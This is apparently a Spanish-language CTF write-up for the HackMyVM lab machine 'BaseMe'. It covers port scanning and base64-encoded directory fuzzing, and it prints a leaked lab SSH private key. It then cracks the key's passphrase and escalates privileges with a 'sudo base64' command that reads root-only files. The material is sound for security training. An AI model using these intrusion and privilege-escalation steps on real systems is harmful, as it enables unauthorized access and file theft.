---
layout      : post
title       : "BaseMe - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/baseme-HackMyVM/previsualización.jpg
category    : [ HackMyVM ]
tags        : [ Linux ]
---

BaseMe es una máquina de nivel fácil de la plataforma HackMyVm en la que tocaremos mucho Base64 y crackeo de RSA.

# Escaneo de Puertos

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos dos puertos abiertos, el 22 (ssh) y el 80 (http).

# Explotación

Abro el navegador para ver que tenemos en el puerto 80.

Al abrirlo encuentro una cadena codificada en base64 y varias palabras que podríamos usar más tarde como diccionario para algún tipo de ataque que lo requiera.

![](/assets/images/HMV/baseme-HackMyVM/dicbase64.png)


Decodificamos la cadena:

```bash
❯ echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK " | base64 -d
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

Todo lo necesario ha de estar en base64 según dice la nota.

A continuación procedo a fuzzear para buscar posibles rutas en el servidor, pero antes de nada debemos codificar las palabras del diccionario que usaremos en base64.

Yo usaré un pequeño script para realizar esta tarea de forma automatizada y más rápido.


```bash
#!/bin/bash

for i in `cat common.txt` ; do echo $i | base64 >> base64enc.txt ; done
```

Codifico el diccionario common.txt de la ruta `/usr/share/wordlists/dirb/common.txt` y ahora ya sí podemos fuzzear usando el diccionario.

```bash
❯ gobuster -u http://192.168.0.27 -w base64enc.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.0.27/
[+] Threads      : 10
[+] Wordlist     : base64enc.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/05/02 01:50:32 Starting gobuster
=====================================================
/aWRfcnNhCg== (Status: 200)
/cm9ib3RzLnR4dAo= (Status: 200)
=====================================================
2022/05/02 01:50:34 Finished
=====================================================
```

Como podemos ver tenemos las siguientes rutas:

```bash
/aWRfcnNhCg== 
/cm9ib3RzLnR4dAo=
```

Accedo desde el navegador a la ruta `/aWRfcnNhCg==` y se me descarga un archivo, la otra ruta no nos dio nada que nos pudiera servir.

![](/assets/images/HMV/baseme-HackMyVM/rsaenc.png)

Decodifico la cadena y es una clave RSA.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

Asignamos permisos 600 a la clave id_rsa

`chmod 600 id_rsa`

Intento usar la clave para loguearme por ssh pero me pide la contraseña, por lo tanto debo crackear la id_rsa para obtener la contraseña.

Para crackear la clave RSA puedo usar **ssh2john** pero usaré otra herramienta:

[https://github.com/d4t4s3c/RSAcrack](https://github.com/d4t4s3c/RSAcrack)

Usaré la herramienta RSAcrack creada por d4t4s3c.

Pero antes de nada debemos recordar que todo ha de estar codificado en base64 y que necesitamos un diccionario... Y me acordé de la lista de palabras que encontramos al comienzo del CTF.

Codifico la lista de palabras:

```bash
aWxvdmV5b3UK
eW91bG92ZXlvdQo=
c2hlbG92ZXN5b3UK
aGVsb3Zlc3lvdQo=
d2Vsb3ZleW91Cg==
dGhleWhhdGVzbWUK
```

Y procedo a crackear la clave:


![](/assets/images/HMV/baseme-HackMyVM/rsa.gif)


Ya tenemos la contraseña, ahora debemos loguearnos por ssh usando la misma.

Me logueo por ssh y ya podremos leer la flag user.txt

```bash
❯ ssh lucas@192.168.0.27 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep  2 20:13:28 2022 from 192.168.0.52
```

# Escalada de Privilegios

Ahora procedo a escalar privilegios para leer la bandera root.txt

Lanzando `sudo -l` puedo ver que puedo ejecutar el binario base64 como root sin contraseña.

Asique me dirijo a la siguiente fuente:

[https://gtfobins.github.io/gtfobins/base64/](https://gtfobins.github.io/gtfobins/base64/)


![](/assets/images/HMV/baseme-HackMyVM/base64gtfo.png)

Si ejecutamos el comando podemos leer cualquier archivo del sistema.


`sudo /usr/bin/base64 /root/root.txt | base64 --decode` 

Y listo, ya tenemos la flag root.




